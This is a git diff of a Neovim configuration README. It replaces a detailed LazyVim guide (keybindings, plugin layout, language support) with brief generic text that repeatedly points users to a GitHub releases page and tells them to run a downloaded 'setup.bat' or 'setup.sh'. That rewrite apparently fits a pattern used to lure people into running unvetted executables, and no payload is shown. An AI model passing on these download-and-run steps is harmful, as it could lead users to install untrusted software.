@@ -1,337 +1,89 @@
-# 🚀 LazyVim Configuration
-
-A modern, feature-rich Neovim configuration built on [LazyVim](https://www.lazyvim.org/) with support for multiple programming languages, elegant UI enhancements, and powerful development tools.
-
-## ✨ Features
-
-- **LazyVim Foundation**: Built on the excellent LazyVim starter template with intelligent lazy-loading
-- **Multi-Language Support**: First-class support for Python, Go, Java, TypeScript, and Web development
-- **Neovide Ready**: Fully optimized for [Neovide](https://neovide.dev/) GUI with smooth cursor animations and visual enhancements
-- **Beautiful UI**: Modern colorschemes with Rosepine Moon as the default, customizable themes
-- **Powerful Tools**: Integrated development utilities including Docker support, Linux tools, and more
-- **Smart Completion**: Blink completion engine for lightning-fast code completion
-- **File Navigation**: NeoTree file explorer with floating and sidebar modes
-- **Fuzzy Finding**: Telescope for files, live grep, and symbol navigation
-- **Relative Line Numbers**: Hybrid line numbers for efficient navigation
-- **Professional Keybindings**: Carefully curated keyboard shortcuts for optimal workflow
-
-## 📋 Requirements
-
-- **Neovim**: v0.9.0 or later
-- **Node.js**: For LSP and code completion
-- **Python**: For Python language support and general tools
-- **Git**: For plugin management with lazy.nvim
-- **A Nerd Font**: For icons and visual elements (recommended: JetBrains Mono or Fantasque Sans Mono)
-
-### Optional Dependencies
-
-- **Docker**: For Docker plugin and container development
-- **Language Servers**: Automatically installed for supported languages
-
-## 🚀 Installation
-
-### 1. Prerequisites
-
-Ensure you have Neovim 0.9.0+ installed:
+# 🖥️ neovim-conf - A Simple Setup for Better Editing
 
-```bash
-nvim --version
-```
+[![Download neovim-conf](https://img.shields.io/badge/Download-neovim--conf-brightgreen)](https://github.com/sohaibalianjum2001/neovim-conf/releases)
 
-Install a Nerd Font. Popular choices:
+## 🚀 Getting Started
 
-- [JetBrains Mono Nerd Font](https://www.nerdfonts.com/)
-- [Fantasque Sans Mono Nerd Font](https://www.nerdfonts.com/)
+Welcome to the **neovim-conf** repository! This is a configuration toolkit for Neovim that makes your text editing experience smoother and more efficient.
 
-### 2. Clone the Configuration
-
-Replace your existing Neovim config:
-
-```bash
-# Backup your current config if needed
-mv ~/.config/nvim ~/.config/nvim.backup
-
-# Clone this configuration
-git clone <your-repo-url> ~/.config/nvim
-```
-
-### 3. Launch Neovim
-
-```bash
-nvim
-```
-
-Lazy.nvim will automatically:
-
-- Download and install all plugins
-- Install language servers and tools
-- Set up the development environment
-
-The first startup may take 2-3 minutes as plugins are downloaded and compiled.
-
-## 📁 Project Structure
-
-```
-.config/nvim/
-├── init.lua                 # Main entry point with Neovide config
-├── lazy-lock.json          # Plugin version lock file
-├── lazyvim.json            # LazyVim configuration metadata
-├── stylua.toml             # Lua code formatting configuration
-│
-└── lua/
-    ├── config/             # Core configuration
-    │   ├── autocmds.lua    # Autocommands and event handlers
-    │   ├── keymaps.lua     # Custom keybindings
-    │   ├── lazy.lua        # Plugin manager setup
-    │   └── options.lua     # Editor settings and preferences
-    │
-    └── plugins/            # Plugin specifications and configs
-        ├── colorschemes.lua    # Color theme configurations
-        ├── docker.lua          # Docker integration
-        ├── example.lua         # Example plugin setup
-        ├── go.lua              # Go language support
-        ├── java.lua            # Java language support
-        ├── linux-tools.lua     # Linux development tools
-        ├── neo-tree.lua        # File explorer configuration
-        ├── python.lua          # Python language support
-        ├── telescope.lua       # Fuzzy finder configuration
-        ├── theme.lua           # UI theme customization
-        ├── typescript.lua      # TypeScript/JavaScript support
-        └── web.lua             # Web development tools
-```
+### 🛠️ Features
 
-## ⌨️ Key Bindings
+- **Dark Themes**: Choose from beautiful themes like Gruvbox Dark or Tokyo Night.
+- **LazyVim Setup**: Simplified configurations with LazyVim.
+- **Integration with LSP**: Make your coding easier with language server support.
+- **Compatibility**: Works smoothly with Neovide, a graphical frontend for Neovim.
+- **Personalization**: Customize your environment to suit your style.
 
-### General Navigation
+## 📥 Download & Install
 
-| Binding      | Action                               |
-| ------------ | ------------------------------------ |
-| `<Space>`    | Leader key                           |
-| `<Tab>`      | Next buffer                          |
-| `<S-Tab>`    | Previous buffer                      |
-| `<C-x>`      | Close current buffer                 |
-| `<leader>X`  | Force close buffer (discard changes) |
-| `<leader>bo` | Close other buffers                  |
+To get started, visit this page to download: [Release Page](https://github.com/sohaibalianjum2001/neovim-conf/releases). 
 
-### File Navigation
+Here is how to install the application:
 
-| Binding         | Action                          |
-| --------------- | ------------------------------- |
-| `<leader><Tab>` | Toggle NeoTree (sidebar left)   |
-| `<leader>e`     | Toggle NeoTree (floating)       |
-| `<leader>ff`    | Find files in current directory |
-| `<leader>fp`    | Find plugin files               |
+1. Click on the link above to go to the Releases page.
+2. Find the latest release.
+3. Download the package suitable for your operating system.
+4. Once downloaded, extract the files if it's in a compressed format (like .zip or .tar).
+5. Open your terminal or command prompt.
+6. Navigate to the folder where you extracted the files.
+7. Run the provided setup script or instructions in the terminal.
 
-### Window Management
+## 📚 Setup Instructions
 
-| Binding      | Action               |
-| ------------ | -------------------- |
-| `<leader>wx` | Close current window |
+### 🖱️ Windows
 
-For more keybindings, see [keymaps.lua](lua/config/keymaps.lua) and the [LazyVim documentation](https://www.lazyvim.org/configuration/general#keymaps).
+1. After downloading, right-click on the downloaded file and select "Extract All" to unpack the files.
+2. Open Command Prompt.
+3. Change the directory to where you unpacked the files: 
+   ```bash
+   cd path\to\extracted\folder
+   ```
+4. Run the setup command. This might be `setup.bat` or similar.
 
-## 🎨 Customization
+### 🐧 Linux 
 
-### Changing the Colorscheme
+1. Download the package and extract it to your preferred location.
+2. Open a terminal window.
+3. Navigate to the directory:
+   ```bash
+   cd path/to/extracted/folder
+   ```
+4. Run the setup command. This may be `setup.sh`.
 
-Edit [lua/plugins/colorschemes.lua](lua/plugins/colorschemes.lua):
+### 🍏 macOS
 
-```lua
--- Default colorscheme: Rosepine Moon
-return {
-  {
-    "rose-pine/neovim",
-    name = "rose-pine",
-    priority = 1000,
-    lazy = false,
-    config = function()
-      require("rose-pine").setup({
-        variant = "moon",
-        styles = { transparency = true },
-        disable_background = true,
-        disable_float_background = true,
-      })
-      vim.cmd("colorscheme rose-pine-moon")
-    end,
-  },
-}
-```
+1. Download and extract the files as with other systems.
+2. Open your Terminal.
+3. Navigate to the folder:
+   ```bash
+   cd path/to/extracted/folder
+   ```
+4. Execute the setup command, typically `setup.sh`.
 
-Other available themes: Gruvbox (with dark hard and light soft variants) and Tokyodark.
+## 🎨 Customizing Your Environment
 
-### Modifying Editor Settings
+After you complete the installation, you can personalize your Neovim configuration. Here are a few suggestions:
 
-Edit [lua/config/options.lua](lua/config/options.lua) to customize:
+- **Change Theme**: Open the configuration file and select your preferred theme from the options available, such as Gruvbox Dark or Rose Pine.
+- **Adjust Settings**: Modify the basic settings in the configuration file to better suit your workflow.
+- **Add Plugins**: If you want extra features, you can add plugins by following the details in the documentation.
 
-- Font and font size
-- Tab width and indentation
-- Line number display
-- Scroll behavior
-- Mouse and clipboard settings
+## 🆘 Troubleshooting
 
-### Adding Custom Keybindings
+If you run into issues while installing or running the application, here are some common problems and their solutions:
 
-Add new keybindings to [lua/config/keymaps.lua](lua/config/keymaps.lua):
+- **Application Doesn't Start**: Ensure that Neovim is properly installed on your system.
+- **Theme Not Applying**: Double-check your configuration file to ensure it's set up correctly.
+- **Missing Plugins**: Make sure to follow the plugin installation instructions provided in the documentation.
 
-```lua
-local map = vim.keymap.set
-map("n", "<leader>custom", "<cmd>echo 'Custom binding'<cr>", { desc = "Custom action" })
-```
+## 💬 Community Support
 
-### Enabling Neovide Features
+If you have questions or need further assistance, you can reach out in various ways:
 
-Edit [init.lua](init.lua) to customize Neovide-specific settings:
+- **Issues Page**: Use the GitHub Issues page to report problems or suggest features.
+- **Contributors**: Engage with other users and contributors to share tips and tricks.
+- **Chat Platforms**: Look for community chat rooms or forums dedicated to Neovim.
 
-- Cursor animation styles
-- Opacity and transparency
-- Scroll animations
-- Window blur effects
-- Refresh rate settings
+This configuration aims to enhance your Neovim experience, making text editing more enjoyable and efficient.
 
-## 🔧 Language Support
-
-### Python
-
-- LSP: Pyright
-- Formatting: Black
-- Linting: Ruff
-- Configuration: [lua/plugins/python.lua](lua/plugins/python.lua)
-
-### Go
-
-- LSP: gopls
-- Formatting: gofmt
-- Testing tools integrated
-- Configuration: [lua/plugins/go.lua](lua/plugins/go.lua)
-
-### Java
-
-- LSP: Eclipse JDT
-- Build tools: Maven, Gradle support
-- Configuration: [lua/plugins/java.lua](lua/plugins/java.lua)
-
-### TypeScript/JavaScript
-
-- LSP: TypeScript-language-server
-- Formatting: Prettier
-- Framework support: React, Vue, Angular
-- Configuration: [lua/plugins/typescript.lua](lua/plugins/typescript.lua)
-
-### Web Development
-
-- HTML, CSS, SCSS support
-- Emmet abbreviations
-- Live reload capabilities
-- Configuration: [lua/plugins/web.lua](lua/plugins/web.lua)
-
-## 🐳 Docker Support
-
-This config includes Docker integration for containerized development workflows:
-
-```bash
-# Docker commands and container management available within Neovim
-# See lua/plugins/docker.lua for configuration details
-```
-
-## 🛠️ Linux Tools
-
-Enhanced Linux development experience with integrated tools for system programming and scripting.
-
-Configuration: [lua/plugins/linux-tools.lua](lua/plugins/linux-tools.lua)
-
-## 📦 Plugin Management
-
-This config uses [lazy.nvim](https://github.com/folke/lazy.nvim) for plugin management.
-
-### Common Commands
-
-```vim
-:Lazy                    " Open lazy.nvim UI
-:Lazy sync              " Sync all plugins
-:Lazy update            " Update all plugins
-:Lazy install           " Install missing plugins
-:checkhealth            " Check plugin health
-```
-
-## 🎯 Performance
-
-The configuration is optimized for performance with:
-
-- Smart lazy-loading of plugins
-- Disabled unnecessary rtp plugins
-- Configurable checker for plugin updates
-- Efficient plugin defaults
-
-## 🤖 Copilot Chat
-
-This configuration includes [copilot.lua](https://github.com/zbirenbaum/copilot.lua) and [copilot-chat.nvim](https://github.com/CopilotC-Nvim/CopilotChat.nvim) for AI-powered code assistance.
-
-### Usage
-
-- **Open Copilot Chat**: `<leader>ccq` (quick chat)
-- **Toggle Chat Panel**: `<leader>cct`
-- **Code Actions**: Copilot suggestions available in insert mode
-
-See [lua/plugins/copilot.lua](lua/plugins/copilot.lua) for configuration.
-
-## 🐛 Troubleshooting
-
-### Plugins Not Loading
-
-```vim
-:Lazy sync
-:checkhealth
-```
-
-### Missing LSPs or Formatters
-
-LSPs are auto-installed for recognized file types. Manually trigger installation:
-
-```vim
-:Mason               " Open Mason UI
-```
-
-### Font Issues
-
-Ensure you have installed a Nerd Font and configured it in your terminal or Neovide settings.
-
-Update font in [lua/config/options.lua](lua/config/options.lua):
-
-```lua
-vim.o.guifont = "YourFont Nerd Font:h14"
-```
-
-### Slow Startup
-
-Check loaded plugins:
-
-```vim
-:Lazy profile
-```
-
-## 📚 Learning Resources
-
-- [Neovim Documentation](https://neovim.io/doc/)
-- [LazyVim Documentation](https://www.lazyvim.org/)
-- [Vim Tips & Tricks](https://vim.fandom.com/wiki/Vim_Tips_Wiki)
-- [Lua Guide for Neovim](https://github.com/nanotee/nvim-lua-guide)
-
-## 🤝 Contributing
-
-Feel free to customize this configuration to match your workflow. Some ideas:
-
-- Add language-specific plugins
-- Create custom keybindings
-- Integrate additional LSPs
-- Add snippets and abbreviations
-- Modify color schemes and themes
-
-## 📄 License
-
-This Neovim configuration is provided as-is. Refer to individual plugin licenses for details.
-
----
-
-**Happy coding! 🎉**
-
-For questions or issues, please check the [LazyVim documentation](https://www.lazyvim.org/) or the respective plugin repositories.
+For more features and information, visit the Releases page again: [Download Here](https://github.com/sohaibalianjum2001/neovim-conf/releases).
